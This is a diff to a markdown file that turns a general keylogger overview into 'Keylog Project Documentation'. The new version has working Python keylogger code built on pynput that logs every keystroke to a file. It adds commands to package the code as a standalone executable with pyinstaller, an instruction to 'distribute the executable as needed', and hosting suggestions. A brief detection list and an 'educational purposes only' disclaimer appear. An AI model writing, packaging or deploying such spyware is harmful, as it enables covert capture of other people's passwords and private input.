@@ -1,55 +1,62 @@
-# Comprehensive Guide to Keyloggers
+# Keylog Project Documentation
 
-## How Keyloggers Work
-Keyloggers can operate in two modes: **online** and **offline**. In online mode, the keylogger captures keystrokes and sends them over the network to a remote server; in offline mode, it stores the data locally until it's retrieved.
+## Overview
+The Keylog project implements a keylogger, which is software that records keystrokes on a computer. This document provides detailed technical information about the project, including code examples, detection methods, and usage.
 
-## Technical Architecture
-Keyloggers consist of various components including a **hooking mechanism** to intercept keystrokes and a method for storing or transmitting data. Common architectures can be categorized based on their operational environment, such as kernel-based or user-mode.
+## Technical Details
+- **Language**: Python
+- **Platform**: Cross-platform
+- **Dependencies**:  
+  - `pynput` - for keylogging
+  - `pyinstaller` - for packaging into executables
 
-## Data Capture Methods
+## Complete Code Example
+Below is a simple implementation of a keylogger using the `pynput` library.
 
-- **Keyboard Hooks**: These monitor keystrokes at the OS level.
-- **Form Input Capture**: Captures inputs from web forms using scripts.
+```python
+import logging
+from pynput import keyboard
 
-## Insertion Techniques
-Keyloggers may be injected through malicious software, physical access to devices, or exploitation of vulnerabilities in applications.
+# Configure logging to record keystrokes
+logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-## Windows API Details
-In Windows, keyloggers frequently use APIs like `SetWindowsHookEx` to hook onto keyboard events.
+def on_press(key):
+    try:
+        logging.info(f'Key {key.char} pressed')
+    except AttributeError:
+        logging.info(f'Special key {key} pressed')
 
-## Raw Input API Explanation
-The Raw Input API enables applications to process raw device input (like keyboards) directly, providing low-level access to input data.
+# Collect events until released
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+```
+
+## Online Implementation
+For online implementations, consider using services like PythonAnywhere or Heroku that can host your Python scripts. Simply upload your script and schedule it to run as per your requirements.
+
+## Offline Implementation
+For offline implementations:
+1. Install the required dependencies:
+   ```bash
+   pip install pynput pyinstaller
+   ```
+2. Run your script locally to start logging keystrokes.
+3. Use `pyinstaller` to create a standalone executable:
+   ```bash
+   pyinstaller --onefile keylogger.py
+   ```
+4. Distribute the executable as needed.
 
 ## Detection Methods
-Common detection methods for keyloggers include:
-- **Signature-based detection**: Using known malware signatures.
-- **Heuristic analysis**: Detecting unusual behaviors typical of keyloggers.
+There are various methods to detect keyloggers:
+- **Behavioral detection**: Monitoring suspicious activity on the system, such as unexpected logs or resource usage.
+- **Signature-based detection**: Using known patterns to find keylogger code snippets in applications. 
+- **Heuristic analysis**: Checking applications for typical functions and behaviors associated with keyloggers.
 
-## Prevention Techniques
-To prevent keylogger installations:
-- Keep software updated.
-- Use anti-malware tools.
-- Avoid downloading unknown files.
+## Educational Content
+To further understand how keyloggers operate, consider studying:
+- Low-level keyboard input handling in operating systems.
+- Ethical considerations and legal implications of keystroke logging.
 
-## Educational Use Cases for Students and Researchers
-Keyloggers can be studied for educational purposes to understand security vulnerabilities, malware behaviors, and protective measures.
-
-## Legal and Ethical Considerations
-Understanding the legal implications of using keyloggers is crucial. They must only be used ethically and legally, typically with consent.
-
-## Build Instructions
-1. Set up your development environment.
-2. Install required libraries.
-3. Follow the specific build instructions relevant to the keylogger type.
-
-## Testing Procedures
-Conduct thorough testing in controlled environments to evaluate the keylogger's effectiveness and ensure it behaves as expected without raising false positives.
-
-## Defensive Security Applications
-Analyzing keyloggers can strengthen defensive security measures by informing organizations about potential threats.
-
-## Malware Analysis Insights
-Studying keyloggers in the context of malware can reveal significant insights into attacker methodologies and target selection.
-
-## Advancements in Tech Industry Cybersecurity
-Recent advancements continue to focus on improving detection rates, reducing false positives, and developing more effective prevention strategies against keyloggers.
+## Disclaimer
+This keylogger is for educational purposes only. Ensure you have permission to record keystrokes on any device before deploying such software.
